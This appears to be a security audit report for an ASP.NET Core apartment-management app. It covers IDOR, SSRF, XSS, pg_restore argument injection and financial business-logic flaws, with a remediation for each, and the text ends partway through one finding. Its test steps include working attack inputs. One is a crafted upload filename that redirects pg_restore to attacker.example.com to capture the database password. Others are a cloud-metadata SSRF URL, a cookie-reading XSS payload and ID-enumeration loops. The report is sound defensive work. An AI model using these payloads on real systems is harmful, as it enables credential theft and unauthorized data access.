# Security Assessment Final Report

**Project**: Kumburgaz (Site/Apartment Management Web App) — ASP.NET Core 10 MVC monolith (desktop admin + `/m` mobile resident area + Identity area), EF Core over SQLite/PostgreSQL
**Generated**: 2026-07-17
**Scans completed**: IDOR, SQLi, SSRF, XSS, RCE, XXE, File Upload, Path Traversal, SSTI, JWT, Missing Auth, Business Logic, GraphQL Injection, Hardcoded Secrets

---

## Executive Summary

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High     | 8 |
| Medium   | 10 |
| Low      | 1 |
| **Total confirmed findings** | **19** |

Scans with no confirmed vulnerabilities: SQLi, XXE, SSTI, JWT (no JWT usage in codebase), GraphQL Injection (no GraphQL technology in codebase), Hardcoded Secrets

Findings requiring manual review: 1 (Document attachment inline preview content-sniffing edge case — see `sast/fileupload-results.md`)

Note: the pg_restore argument-injection vulnerability was independently identified by both the RCE scan and the File Upload scan (same root cause, same file). It is consolidated into a single finding below (see High #2) rather than listed twice.

---

## Vulnerability Index

| # | Title | Type | Severity | Endpoint / File |
|---|-------|------|----------|----------------|
| 1 | Cross-module financial data leak via Search | Missing Auth (Broken Function-Level Authz) | High | `GET /Search/Global?term=` |
| 2 | pg_restore argument injection via unsanitized filename | RCE (Command/Argument Injection) | High | `POST /Backups/Restore` |
| 3 | Cross-entity attachment disclosure (Mobile Gider) | IDOR | High | `GET /m/Gider/Ek?id=` |
| 4 | Stored SSRF via Web Push subscription endpoint | SSRF | High | `POST /m/Bildirimler/Abone` |
| 5 | Stored XSS via Block name (JS string breakout) | XSS | High | `Views/Blocks/Index.cshtml` (`/Blocks`) |
| 6 | Resident self-approves dues credit via unbounded mahsup | Business Logic (Workflow Bypass) | High | `POST /m/Gider/Yeni` |
| 7 | Mahsup amount unbounded vs. actual debt (manufactured advance) | Business Logic (Limit Violation) | High | `POST /m/Gider/Yeni` |
| 8 | Unbounded advance balance auto-consumed into future dues | Business Logic (Balance Logic) | High | `POST /m/Gider/Yeni`, `POST /Collections/Create` |
| 9 | Push-subscription hijack via endpoint collision | IDOR | Medium | `POST /m/Bildirimler/Abone` |
| 10 | Push-subscription deletion without ownership check | IDOR | Medium | `POST /m/Bildirimler/AbonelikSil` |
| 11 | Race condition on duplicate collection submission | Business Logic (Race Condition) | Medium | `POST /Collections/CreateForUnit`, `/Collections/Create` |
| 12 | Unrestricted backdating of ledger/collection/dues entries | Business Logic (Time Logic) | Medium | `POST /Ledger/Create`, `/CashBank/Create*`, `/DuesGeneration/Generate` |
| 13 | Backup restore accepts unvalidated file content | File Upload | Medium | `POST /Backups/Restore` |
| 14 | DB restore performs unvalidated, unaudited full overwrite | Business Logic (Workflow Integrity) | Medium | `POST /Backups/Restore` |
| 15 | Opening balances rewritten with no bounds/audit | Business Logic (Balance Logic) | Medium | `POST /OpeningBalances/Save` |
| 16 | Cash/bank opening balance reset/rewrite with no history check | Business Logic (Balance Logic) | Medium | `POST /CashBank/DeleteOpeningBalance`, `/UpdateOpeningBalance` |
| 17 | Mahsup category not sanity-checked against amount | Business Logic (Entitlement Bypass) | Medium | `POST /m/Gider/Yeni` |
| 18 | CashBank CSV import fuzzy-matches dues with no confidence threshold | Business Logic (Automation Gap) | Medium | `POST /CashBank/CommitImport` |
| 19 | Mahsup evidence/description editable indefinitely post-credit | Business Logic (Evidence Integrity) | Low | `POST /m/Gider/Duzenle/{id}` |

---

## Findings

### High

#### Cross-module financial data leak via Search — Missing Authentication/Authorization

- **Source scan**: `sast/missingauth-results.md`
- **Classification**: Vulnerable
- **Endpoint / File**: `GET /Search/Global?term=` — `Controllers/SearchController.cs`
- **Severity rationale**: The role/permission matrix explicitly withholds `Tahsilatlar`/`Muhasebe`/`KasaBanka` view access from `Personel`/`SadeceGoruntuleme` roles, but this single endpoint (gated only by the low-bar `Raporlar` module) aggregates and returns collections, ledger transactions, and **bank account IBANs** to those roles — a direct confidentiality breach of financial PII reachable by any authenticated low-privilege staff account, including via numeric-ID enumeration with no search term needed.
- **Issue**: The action's only authorization check is class-level `[ModuleAuthorize(AppModules.Raporlar)]`. It queries `Units`, `Accounts`, `Collections`, `LedgerTransactions`, `BankAccounts`, `CashBoxes`, `IncomeExpenseCategories`, `DocumentRecords`, and `ServiceRequests` without verifying the caller holds view rights on each of those individual modules.
- **Impact**: Vertical/cross-module privilege escalation — a report-viewer/personnel role gains read access to payment history, ledger entries, and bank IBANs that the permission matrix explicitly withholds.
- **Proof**:
  ```csharp
  [ModuleAuthorize(AppModules.Raporlar)]
  public class SearchController(ApplicationDbContext db) : Controller
  {
      public async Task<IActionResult> Global(string? term)
      {
          var collections = await db.Collections.AsNoTracking()
              .Include(x => x.BankAccount).Include(x => x.CashBox)
              .Where(x => (hasNumericId && x.Id == numericId) || ... ) ...
          var bankAccounts = await db.BankAccounts.AsNoTracking()
              .Where(x => ... || (x.Iban != null && x.Iban.ToLower().Contains(normalized))) ...
      }
  }
  ```
  No per-entity-type permission check exists anywhere in the action body — only the blanket class-level `Raporlar` check.
- **Remediation**: Gate each result block behind the permission for the module it belongs to (inject `PermissionService`, filter each `results.AddRange(...)` call behind the corresponding module's view permission before it executes).
- **Dynamic Test**:
  ```
  1. Create/use a test user with only the `Personel` role (view-only: Panel + Raporlar).
  2. Confirm navigating to /Collections or /CashBank is denied (403).
  3. Issue GET /Search/Global?term=1 (or a term matching an existing IBAN/description).
  4. Observe the JSON response includes Tahsilat/Finans/bank entries with amounts, IBANs,
     and reference numbers the user has no explicit permission to view.
  ```

---

#### pg_restore argument injection via unsanitized filename (with credential exfiltration path)

- **Source scans**: `sast/rce-results.md` (Likely Vulnerable), `sast/fileupload-results.md` (Vulnerable) — same root cause, consolidated
- **Classification**: Vulnerable / Likely Vulnerable ⚠ (independently confirmed by two scans)
- **Endpoint / File**: `POST /Backups/Restore` — `Controllers/BackupsController.cs` (line 57), `Services/BackupService.cs` (lines 60-73, 129-153, 155-194)
- **Severity rationale**: This is command/argument injection that can be leveraged to redirect `pg_restore` to an attacker-controlled PostgreSQL listener, causing the real production `PGPASSWORD` to be sent in the resulting auth handshake — a direct credential-confidentiality breach layered on top of an already-destructive operation. Access requires SystemAdmin authentication, which moderates but does not eliminate the risk (compromised/rogue admin, CSRF-adjacent scenarios).
- **Issue**: `BackupsController.Restore` builds `tempPath` using `Path.GetFileName(file.FileName)`, which strips path separators but not double-quote characters. This flows unchanged into `BuildPgRestoreArgs` → `$"{BuildPgConnectionArgs(connectionString)} --clean --if-exists \"{source}\""`, passed to `ProcessStartInfo.Arguments` (a single string, re-parsed by the OS into argv even with `UseShellExecute = false`). An embedded `"` + whitespace in the uploaded filename closes the quoted argument early and injects additional `pg_restore` flags (e.g., `-h`, `-p`, `-U`, `-d`). ASP.NET Core's multipart parser unescapes backslash-escaped quotes in the `filename` header, so an attacker crafting a raw multipart POST fully controls this value. Additionally, the same endpoint accepts **any file content with zero validation** (no magic-byte/format check) — for SQLite deployments, `File.Copy(filePath, target, overwrite: true)` unconditionally replaces the live production database file with arbitrary bytes.
- **Impact**: An attacker who can reach this SystemAdmin endpoint can (a) redirect `pg_restore`'s connection to an attacker-controlled host, causing the real database password to be sent to that host during the auth handshake — full credential exfiltration; and (b) independently, since `pg_restore` executes arbitrary statements from a custom-format dump (including `COPY ... FROM PROGRAM 'command'` on a sufficiently privileged role), the endpoint already grants a path to OS command execution as the PostgreSQL server process via dump content alone; and (c) for SQLite deployments, corrupt/destroy the production database with zero content validation (mitigated somewhat by an automatic pre-restore backup).
- **Proof**:
  ```csharp
  // BackupsController.cs:57
  var tempPath = Path.Combine(tempDir, $"{Guid.NewGuid():N}-{Path.GetFileName(file.FileName)}");

  // BackupService.cs:131 (BuildPgRestoreArgs)
  return $"{BuildPgConnectionArgs(connectionString)} --clean --if-exists \"{source}\"";
  // source = tempPath, unescaped; ProcessStartInfo.Arguments (single string) re-parsed into argv

  // BackupService.cs:68 (SQLite branch, RestoreAsync)
  File.Copy(filePath, target, overwrite: true);   // no magic-byte/format validation of any kind
  ```
- **Remediation**:
  1. Switch `ProcessStartInfo.Arguments` to `ArgumentList` for `pg_dump`/`pg_restore` invocations — each argument as a discrete token, eliminating the injection class entirely.
  2. Do not derive the temp filename from `file.FileName` at all — use `Guid.NewGuid()` alone.
  3. Validate uploaded backup content before use: check the "SQLite format 3\0" magic header (SQLite) or "PGDMP" magic header (pg custom-format dump); reject anything else.
- **Dynamic Test**:
  ```
  curl -X POST https://target/Backups/Restore \
    -H "Cookie: <systemadmin-auth-cookie>" \
    -F "__RequestVerificationToken=<csrf-token>" \
    -F 'file=@payload.dump;filename="a\" -h attacker.example.com -p 5432 -U probe -d x --clean --if-exists \"b.dump"'
  # Observe (via a listener on attacker.example.com:5432) a PostgreSQL connection/auth
  # attempt carrying the real PGPASSWORD-derived auth exchange.
  ```

---

#### Cross-entity attachment disclosure — Mobile Gider `Ek` action (IDOR)

- **Source scan**: `sast/idor-results.md`
- **Classification**: Vulnerable
- **Endpoint / File**: `GET /m/Gider/Ek?id={attachmentId}` — `Areas/Mobile/Controllers/GiderController.cs` (lines 182-201)
- **Severity rationale**: A low-privilege resident ("Sakin") account can disclose the raw content of arbitrary staff-only documents (e.g., contracts, meeting minutes) that the module-permission system explicitly withholds from residents — a direct confidentiality breach reachable via simple ID brute-forcing.
- **Issue**: `Attachments` is a shared table keyed by `(EntityType, EntityId)`. The `Ek` action looks up the attachment **only by `Id`** — every sibling method in the same codebase filters on `EntityType` in addition to `EntityId`; `Ek` is the outlier:
  ```csharp
  var attachment = await db.Attachments.AsNoTracking().FirstOrDefaultAsync(x => x.Id == id);
  ```
  The subsequent resident-scoping check treats `attachment.EntityId` as if it were always a `LedgerTransactionId`, but for attachments whose real `EntityType` is `"DocumentRecord"` (or another entity), `EntityId` is drawn from a different auto-increment sequence that can numerically collide with a `LedgerTransactionId` the resident legitimately owns.
- **Impact**: A resident can retrieve the file content/filename of an unrelated `Attachment` row belonging to a different entity type — e.g., a staff-only document the resident has no module permission to view at all — by iterating `id=1,2,3,...` and finding one whose `EntityId` collides with a `LedgerTransactionId` the resident already legitimately owns.
- **Proof**: Confirmed `Ek` (line 184) omits the `EntityType == nameof(LedgerTransaction)` predicate applied by every analogous lookup in `LedgerController.cs` (219, 526, 540) and `DocumentsController.cs` (108, 133, 170, 186).
- **Remediation**:
  ```csharp
  var attachment = await db.Attachments.AsNoTracking()
      .FirstOrDefaultAsync(x => x.Id == id && x.EntityType == nameof(LedgerTransaction));
  ```
- **Dynamic Test**:
  ```
  # As a Sakin resident with a valid session:
  # 1. Note a legitimately-owned LedgerTransactionId via GET /m/Gider, e.g. id=42.
  for i in $(seq 1 500); do
    curl -s -o /dev/null -w "%{http_code} id=$i\n" \
      -H "Cookie: <SAKIN_SESSION_COOKIE>" \
      "https://<host>/m/Gider/Ek?id=$i"
  done
  # For any id returning 200 whose Content-Disposition/filename doesn't match a known
  # mahsup receipt, cross-entity disclosure is confirmed.
  ```

---

#### Stored SSRF via Web Push subscription endpoint

- **Source scan**: `sast/ssrf-results.md`
- **Classification**: Vulnerable
- **Endpoint / File**: `POST /m/Bildirimler/Abone` — `Areas/Mobile/Controllers/BildirimlerController.cs` (lines 43-74), `Services/PushSenderService.cs` (lines 39-66), dispatched from `Services/PushDispatchHostedService.cs`
- **Severity rationale**: Any authenticated user — including a low-privilege resident — can plant a stored SSRF primitive that the server will autonomously and repeatedly fire at, including cloud metadata endpoints (`169.254.169.254`), each time a notification event occurs, carrying VAPID auth headers. Confidentiality impact is high if hosted in a cloud VM (potential credential theft from the metadata service).
- **Issue**: The `endpoint` parameter is taken directly from the POST body and persisted with **no validation**: no scheme restriction, no host allowlist. `Lib.Net.Http.WebPush.PushServiceClient` performs no SSRF protection itself and will POST to whatever `Endpoint` string is supplied. Because the attacker's request (subscribing) and the vulnerable outbound request (sending the push) are decoupled in time, this is a stored/second-order SSRF triggered repeatedly by a background dispatcher.
- **Taint trace**: `Request body (endpoint)` → `BildirimlerController.Abone` → `PushSubscription.Endpoint` (DB) → `PushDispatchHostedService` → `PushSenderService.SendAsync` → `PushServiceClient.RequestPushMessageDeliveryAsync` → outbound `HttpClient` POST to `target.Endpoint`.
- **Impact**: Probing/reaching internal network services, cloud metadata credential theft, internal port scanning, or beaconing/DoS-amplification against a third party — the server retries per notification event until the endpoint 404/410s.
- **Remediation**: Enforce `https://` scheme and a strict host allowlist of known push-service domains (FCM, Mozilla autopush, WNS, Apple web push) at intake in `Abone`; reject anything else with 400. Defense in depth: validate again at send-time and/or route delivery through an egress-restricted HTTP handler blocking RFC1918/loopback/link-local ranges.
- **Dynamic Test**:
  ```
  curl -X POST 'https://TARGET/m/Bildirimler/Abone' \
    -H 'Cookie: <auth-cookie>' \
    --data-urlencode '__RequestVerificationToken=<csrf-token>' \
    --data-urlencode 'endpoint=http://169.254.169.254/latest/meta-data/iam/security-credentials/' \
    --data-urlencode 'p256dh=BExamplePublicKey...' \
    --data-urlencode 'auth=ExampleAuthSecret...'
  # Then trigger any notification-firing event (new announcement, request status change)
  # and observe the server-side outbound POST land at the attacker-controlled/internal target.
  ```

---

#### Stored XSS via Block name (JS-string breakout in `onsubmit`)

- **Source scan**: `sast/xss-results.md`
- **Classification**: Vulnerable
- **Endpoint / File**: `Views/Blocks/Index.cshtml` (lines 57-58); value written via `POST /Blocks/Create`, `/Blocks/Edit`
- **Severity rationale**: Persistent XSS executing in the session of any user who views `/Blocks`, enabling session/cookie theft and CSRF-token exfiltration — a confidentiality and integrity impact on other users' authenticated sessions, potentially including higher-privileged admins who also access this module.
- **Issue**: `@item.Name` is interpolated directly inside a single-quoted JS string literal within the `onsubmit` attribute:
  ```cshtml
  <form asp-action="Delete" asp-route-id="@item.Id" method="post"
        onsubmit="return confirm('\'@item.Name\' bloğu silinsin mi?');">
  ```
  Razor HTML-encodes `'` to `&#39;`, but the browser decodes it back to a literal `'` before handing the attribute value to the JS engine, neutralizing the encoding for this JS-string context. `Block.Name` has only `[Required, MaxLength(60)]` — no character restriction — and client-side `maxlength` is trivially bypassed via a direct POST.
- **Impact**: Any user with "Daireler" module access can store a JS payload as a block name; any other viewer with access to `/Blocks` executes it — session/cookie theft, CSRF-token exfiltration, or silent submission of delete forms using the victim's session.
- **Remediation**: Replace the inline `onsubmit="confirm('...')"` pattern with unobtrusive JS reading a `data-block-name="@item.Name"` attribute (correctly HTML-encoded in a plain-attribute context). If inline handlers must be kept, JS-escape the value server-side (`JavaScriptEncoder.Default.Encode`) before embedding it, matching the safe pattern already used in `Views/Audit/Index.cshtml`.
- **Dynamic Test**:
  ```
  1. Log in as a user with "Daireler" module permission.
  2. Create a Block with Name: ');alert(document.cookie);//
  3. Reload /Blocks and click "Sil" (delete) for that block's row.
  4. Observe alert(document.cookie) fires instead of a native confirm() dialog.
  ```

---

#### Resident self-approves dues credit via unbounded mahsup submission

- **Source scan**: `sast/businesslogic-results.md`
- **Classification**: Vulnerable
- **Endpoint / File**: `POST /m/Gider/Yeni` — `Areas/Mobile/Controllers/GiderController.cs` (lines 97-180), `Services/MahsupService.cs` (lines 29-118)
- **Severity rationale**: Direct, self-service financial fraud path — a resident single-handedly clears their own dues obligation with no staff review, undermining the core accounting-integrity control the workflow is meant to provide.
- **Issue**: `GiderController.Yeni` validates only `Amount > 0`, `CategoryId` set, unit ownership, and (for residents) a photo attachment — none of which is an approval gate. `mahsupService.CreateAsync` calls `collectionService.CreateAsync` synchronously in the same request, immediately reducing `DuesInstallment.RemainingAmount`/setting `Status = Paid` before any human reviews the receipt. `MahsupIslem` has no `Status`/approval field at all — only soft-delete fields. No staff-side approval action exists anywhere in the codebase.
- **Impact**: A resident can submit any photo (unvalidated against amount/category) and instantly clear/reduce their dues balance — full compromise of the intended approval workflow.
- **Proof**:
  ```csharp
  // GiderController.cs:140-153 — no pending/staff-approval gate before crediting
  if (isMahsup) { await mahsupService.CreateAsync(...); }
  // MahsupService.cs:63-71 — dues reduced synchronously, same request
  var collectionId = await collectionService.CreateAsync(new CollectionCreateViewModel { ... });
  ```
- **Remediation**: Add a `Status` (Pending/Approved/Rejected) column to `MahsupIslem`. On resident submission, create only the `MahsupIslem`/`Attachment` records (status Pending) — do not call `CollectionService.CreateAsync` until a staff-only `Onayla`/Approve action (gated by `Muhasebe` write) runs.
- **Dynamic Test**:
  ```
  1. Log in as a resident with a unit that has an open DuesInstallment (RemainingAmount = 500 TL).
  2. POST /m/Gider/Yeni with matching UnitId, CategoryId, Amount=500, and a photo.
  3. Check the dues report for that unit: RemainingAmount is now 0 and Status=Paid,
     instantly, with no staff action in between.
  ```

---

#### Mahsup amount unbounded vs. actual debt — manufactured advance credit

- **Source scan**: `sast/businesslogic-results.md`
- **Classification**: Vulnerable
- **Endpoint / File**: `POST /m/Gider/Yeni` — `Services/MahsupService.cs` (lines 29-34), `Services/CollectionService.cs` (lines 89-254)
- **Severity rationale**: Compounds the self-approval finding into a quantifiable, unbounded financial-fraud primitive — a resident can manufacture an arbitrarily large advance credit against their unit with no staff verification.
- **Issue**: `MahsupService.CreateAsync` only checks `request.Amount <= 0` — it never compares against `anchor.RemainingAmount`, and there is no per-transaction ceiling anywhere. Any amount in excess of the targeted installment's remaining balance is intentionally left as an unallocated "advance" (per code comment: "fazlasi avans olarak kalir") rather than rejected.
- **Impact**: A resident can submit, e.g., Amount=50000 against a 500 TL receipt photo; the installment clears and ~49,500 TL becomes an unallocated advance silently offsetting future dues for months/years — a direct self-service financial fraud path.
- **Proof**:
  ```csharp
  // MahsupService.cs:31-34
  if (request.Amount <= 0) { throw new MahsupValidationException("Tutar sıfırdan büyük olmalıdır."); }
  // anchor.RemainingAmount is never compared to request.Amount
  ```
- **Remediation**: Reject (or route to mandatory staff approval) any request where `request.Amount > anchor.RemainingAmount` for resident-submitted mahsups; add a configurable absolute per-transaction cap.
- **Dynamic Test**:
  ```
  1. Resident with Unit X, open installment RemainingAmount = 500 TL.
  2. POST /m/Gider/Yeni with Amount=50000, photo attached.
  3. Confirm installment Status=Paid; Collection.Amount=50000 while allocated=500 —
     the ~49500 delta is an unallocated advance for Unit X.
  ```

---

#### Unbounded advance balance auto-consumed into future dues with no cap or approval

- **Source scan**: `sast/businesslogic-results.md`
- **Classification**: Vulnerable
- **Endpoint / File**: `POST /m/Gider/Yeni`, `POST /Collections/Create` — `Services/CollectionService.cs`, `Services/CollectionAdvanceAllocator.cs`, `Services/MahsupService.cs`
- **Severity rationale**: The third leg of the mahsup-fraud chain — the manufactured advance credit is not merely dormant but is silently and automatically spent down against future dues by a background-style allocator with zero threshold, notification, or approval, and zero first-class visibility (no report shows the credit exists).
- **Issue**: The excess credit from an oversized collection/mahsup is never written to a dedicated ledger row — it exists only implicitly as `collection.Amount - Σ(allocations)`. `CollectionAdvanceAllocator.ApplyAsync` (auto-invoked on every dues-generation cycle) scans and consumes this implicit credit against whichever installments are next open, with no minimum/maximum bound and no staff sign-off — reachable via the low-privilege resident mahsup path since residents are always forced into `isMahsup = true`.
- **Impact**: A resident-built outsized credit is not tracked as a distinct, auditable, capped entity; it's silently swept into future periods with no confirmation step and no report surfacing accumulated advance balances per unit.
- **Proof**:
  ```csharp
  // CollectionAdvanceAllocator.ApplyAsync
  var credit = collection.Amount - collection.Allocations.Sum(x => x.AppliedAmount);
  if (credit <= 0) { continue; }
  foreach (var installment in installments) {
      if (credit <= 0) break;
      var applied = Math.Min(credit, installment.RemainingAmount);
      installment.RemainingAmount -= applied;   // no cap check, no notification
      credit -= applied;
  }
  ```
- **Remediation**: Introduce a first-class `UnitAdvanceBalance`/ledger entity written whenever `Collection.Amount > Σ(Allocations)`. Require staff acknowledgement before `CollectionAdvanceAllocator` consumes credit above a configurable threshold; surface accumulated advance balances in a per-unit report.
- **Dynamic Test**:
  ```
  1. Resident submits mahsup Amount=5000 against a 500 TL installment; 4500 TL advance created.
  2. Staff generates next period's dues; observe CollectionAdvanceAllocator silently
     consume the 4500 TL advance with no confirmation prompt or audit entry.
  ```

---

### Medium

#### Push-subscription hijack via endpoint collision

- **Source scan**: `sast/idor-results.md`
- **Classification**: Vulnerable
- **Endpoint / File**: `POST /m/Bildirimler/Abone` — `Areas/Mobile/Controllers/BildirimlerController.cs` (lines 40-74)
- **Severity rationale**: Cross-user resource takeover (integrity), but limited confidentiality gain for the attacker and requires prior knowledge/leak of the victim's opaque push endpoint value to trigger in practice.
- **Issue**: When an `endpoint` value already exists (possibly belonging to a different user), the action unconditionally reassigns `existing.UserId = userId` and overwrites `P256dh`/`Auth`, with no check that `existing.UserId` already equals the caller.
- **Impact**: If an attacker learns/causes an endpoint collision with a victim's subscription, they can reassign it to themselves and overwrite its encryption keys — disrupting the victim's push notifications and corrupting the row's `UserId` foreign key.
- **Proof**: `existing = FirstOrDefaultAsync(x => x.Endpoint == endpoint)` followed by unconditional `existing.UserId = userId` with no prior ownership check.
- **Remediation**: Check `existing.UserId == userId` before overwriting; reject or create a new row for the caller instead. Consider scoping `Endpoint` uniqueness to `(UserId, Endpoint)`.
- **Dynamic Test**:
  ```
  curl -X POST https://<host>/m/Bildirimler/Abone \
    -H "Cookie: <USER_B_SESSION_COOKIE>" \
    --data-urlencode "endpoint=<SHARED_ENDPOINT>" \
    --data-urlencode "p256dh=<ATTACKER_P256DH>" --data-urlencode "auth=<ATTACKER_AUTH>"
  # Expect: DB row for <SHARED_ENDPOINT> now has UserId=<USER_B_ID>.
  ```

---

#### Push-subscription deletion without ownership check

- **Source scan**: `sast/idor-results.md`
- **Classification**: Vulnerable
- **Endpoint / File**: `POST /m/Bildirimler/AbonelikSil` — `Areas/Mobile/Controllers/BildirimlerController.cs` (lines 77-92)
- **Severity rationale**: Availability/integrity violation only (no data disclosed); exploitability is further limited by the opaque, browser-generated nature of the `endpoint` value.
- **Issue**: The action deletes a `PushSubscription` solely by `x.Endpoint == endpoint`, never comparing `existing.UserId` to `CurrentUserId` (which is defined on the controller but unused here, unlike sibling actions in the same file).
- **Impact**: Any authenticated user — including a low-privilege Sakin — can delete another user's push subscription, silently disabling their notifications.
- **Remediation**: Load `CurrentUserId` and add `&& x.UserId == userId` to the lookup predicate; return `NotFound()`/`Forbid()` on mismatch.
- **Dynamic Test**:
  ```
  curl -X POST https://<host>/m/Bildirimler/AbonelikSil \
    -H "Cookie: <USER_B_SESSION_COOKIE>" \
    --data-urlencode "endpoint=<USER_A_PUSH_ENDPOINT_URL>"
  # Expect: 200 OK; User A's PushSubscription row deleted by User B.
  ```

---

#### Race condition on duplicate collection submission (double-crediting a payment)

- **Source scan**: `sast/businesslogic-results.md`
- **Classification**: Vulnerable
- **Endpoint / File**: `POST /Collections/CreateForUnit`, `/Collections/Create` — `Controllers/CollectionsController.cs`, `Services/CollectionService.cs`
- **Severity rationale**: Financial-integrity impact (double-crediting), no confidentiality exposure; requires either an accidental double-click/retry or a deliberate replay by an already-permissioned user.
- **Issue**: `SaveCollectionAndReallocateAsync` reads open installments and writes reduced `RemainingAmount` inside a per-request transaction that does not prevent two concurrent requests from each reading the same pre-commit state. `Collection` has no `[Timestamp]`/`RowVersion` concurrency token, no unique index on payment-identifying fields, and no idempotency-key check on the interactive create paths (contrast: the CSV import path does have deduplication via `ImportBatchService`).
- **Impact**: A double-click or scripted replay records the same cash deposit twice, over-crediting a unit's dues balance and duplicating the account's transaction history.
- **Remediation**: Add a unique DB index (e.g., `(UnitId, ReferenceNo)`) or a client-generated idempotency key; add a `[Timestamp]` `RowVersion` to `DuesInstallment` to surface `DbUpdateConcurrencyException` on races.
- **Dynamic Test**:
  ```
  for i in 1 2; do
    curl -s -b cookies.txt -c cookies.txt -X POST "https://<host>/Collections/CreateForUnit" \
      -d "unitId=42&amount=1500&date=2026-07-16&accountKey=cash:1&__RequestVerificationToken=<token>" &
  done; wait
  # Check: two Collection rows with identical amount/date/unit appear.
  ```

---

#### Unrestricted backdating of ledger/collection/dues entries into closed periods

- **Source scan**: `sast/businesslogic-results.md`
- **Classification**: Vulnerable
- **Endpoint / File**: `POST /Ledger/Create`, `/Ledger/Edit/{id}`, `/CashBank/Create*`, `/DuesGeneration/Generate`
- **Severity rationale**: Enables silent alteration of historical financial statements after reporting; financial-integrity impact, no direct confidentiality exposure, and the true actor/timestamp is still captured by the generic `AuditLog`.
- **Issue**: `model.Date`/`accrualDate`/`dueDate` are bound directly from the posted form with no server-side check against a "closed period" concept — a codebase-wide grep for period-locking mechanisms returned zero matches.
- **Impact**: Any staff user with Muhasebe/Aidatlar write access (not just SystemAdmin) can post/edit entries with an arbitrary past or future date with no approval or audit distinction.
- **Remediation**: Introduce an explicit period-lock concept (`ClosedPeriod` table or `Settings.LastClosedPeriod`) and validate dates server-side in `LedgerController`, `CashBankController`, and `DuesGenerationService`.
- **Dynamic Test**:
  ```
  1. Log in as a Muhasebe-write user (not SystemAdmin).
  2. POST /Ledger/Create with Date=2024-01-01 and a large Amount.
  3. Observe the entry is accepted and appears in historical reports with no warning.
  ```

---

#### Backup restore accepts unvalidated file content, overwriting live SQLite DB

- **Source scan**: `sast/fileupload-results.md`
- **Classification**: Vulnerable
- **Endpoint / File**: `POST /Backups/Restore` — `Services/BackupService.cs` (lines 60-73), `Controllers/BackupsController.cs` (lines 45-82)
- **Severity rationale**: Availability/integrity impact (production data corruption), gated behind SystemAdmin auth and partially mitigated by an automatic pre-restore backup — no confidentiality exposure on its own (distinct from the argument-injection angle of the same endpoint, reported separately under High).
- **Issue**: No magic-byte/format check, no extension allowlist, no content-type check — only `file.Length == 0` is checked. For SQLite deployments, `File.Copy(filePath, target, overwrite: true)` unconditionally replaces the live database file with whatever bytes were uploaded.
- **Impact**: A SystemAdmin session (legitimate or compromised) can corrupt/destroy the production database by uploading any non-database file.
- **Remediation**: Validate the uploaded file is a well-formed SQLite database (magic header check, `PRAGMA integrity_check`) or valid pg_restore dump (magic header) before accepting it.
- **Dynamic Test**:
  ```
  curl -X POST https://target/Backups/Restore \
    -H "Cookie: <systemadmin-session-cookie>" \
    -F "__RequestVerificationToken=<csrf-token>" \
    -F "file=@garbage.bin;type=application/octet-stream"
  # If SQLite, garbage.bin now overwrites the live database file.
  ```

---

#### DB restore performs an unvalidated, unconfirmed, non-audited full overwrite

- **Source scan**: `sast/businesslogic-results.md`
- **Classification**: Vulnerable
- **Endpoint / File**: `POST /Backups/Restore` — `Controllers/BackupsController.cs`, `Services/BackupService.cs`
- **Severity rationale**: Process/workflow-safety gap around an already-destructive, SystemAdmin-gated operation — availability/integrity impact, no confidentiality exposure; distinct from the content-validation and argument-injection findings on the same endpoint (this finding concerns the missing confirmation/audit step).
- **Issue**: `Restore` only checks the file is non-empty — no checksum/manifest/preview of what will change. Both the SQLite (`File.Copy`) and Postgres (`pg_restore`) restore paths bypass EF Core entirely, so **no `AuditLog` row is ever created** for a restore action — confirmed via grep for `db.AuditLogs.Add(...)` in the relevant files.
- **Impact**: A single POST silently and irreversibly (from the app's perspective) replaces all data with zero in-app record of who did it or when, beyond OS-level file timestamps.
- **Remediation**: Require two-step confirmation (upload → show diff/checksum → confirm), validate uploaded content, and write an audit-log-equivalent entry (actor, timestamp, filename, hash) before the destructive operation, outside the DB being overwritten.
- **Dynamic Test**:
  ```
  1. As SystemAdmin, POST /Backups/Restore with any file.
  2. Observe no preview/diff before execution and no /Audit entry for the restore itself.
  ```

---

#### Opening balances rewritten with no bounds, reason, or maker-checker

- **Source scan**: `sast/businesslogic-results.md`
- **Classification**: Likely Vulnerable ⚠
- **Endpoint / File**: `POST /OpeningBalances/Save` — `Controllers/OpeningBalancesController.cs` (lines 37-95)
- **Severity rationale**: Financial-statement integrity impact only, gated by `Muhasebe` module write access; severity depends on how broadly that permission is granted in the live role matrix (not verifiable from code alone).
- **Issue**: `Save` overwrites `unit.OpeningBalance`/`OpeningBalanceDate` directly from POST arrays with no bound check on `decimal.TryParse`, no "reason" field, no maker-checker workflow, and **no audit log entry**.
- **Impact**: Any Muhasebe-write user can instantly and untraceably rewrite the financial starting point for any subset of units.
- **Remediation**: Bound the accepted range, require a mandatory reason, write an audit-log entry (old→new, user, timestamp), and require maker-checker approval above a materiality threshold.

---

#### Cash/bank opening balance reset/rewrite with no history check or audit

- **Source scan**: `sast/businesslogic-results.md`
- **Classification**: Likely Vulnerable ⚠
- **Endpoint / File**: `POST /CashBank/DeleteOpeningBalance`, `/UpdateOpeningBalance` — `Controllers/CashBankController.cs` (lines 480-540)
- **Severity rationale**: Financial-statement integrity impact only; gated by `KasaBanka` module write access, and stands in stark contrast to the sibling `DeleteAccount` action in the same controller, which does apply a history check — proving the gap is an inconsistency rather than an inherent limitation.
- **Issue**: `DeleteOpeningBalance` unconditionally zeroes `bank.OpeningBalance`/`cash.OpeningBalance` with no check for existing `Collections`/`LedgerTransactions` history and no audit trail; `UpdateOpeningBalance`'s validator always returns `true` (no bound check at all).
- **Impact**: Any Muhasebe/KasaBanka-write user can zero out or arbitrarily rewrite an account's opening balance even with years of transaction history attached, corrupting downstream running-balance calculations.
- **Remediation**: Mirror `DeleteAccount`'s `hasCollections`/`hasLedger` check; add a plausibility/range check; write an audit-log entry recording the prior value.

---

#### Mahsup category not sanity-checked against amount

- **Source scan**: `sast/businesslogic-results.md`
- **Classification**: Likely Vulnerable ⚠
- **Endpoint / File**: `POST /m/Gider/Yeni` — `Areas/Mobile/Controllers/GiderController.cs`, `Services/MahsupService.cs` (lines 39-44)
- **Severity rationale**: Compounding factor of the High-severity unbounded-mahsup findings above rather than an independently exploitable primitive — no distinct additional server-side gate is defeated beyond the amount-bound gap.
- **Issue**: The category lookup is an existence/active/type check only (`x.Active && x.Type == CategoryTypeHelper.Gider`) — no per-category maximum amount or amount-plausibility check exists anywhere.
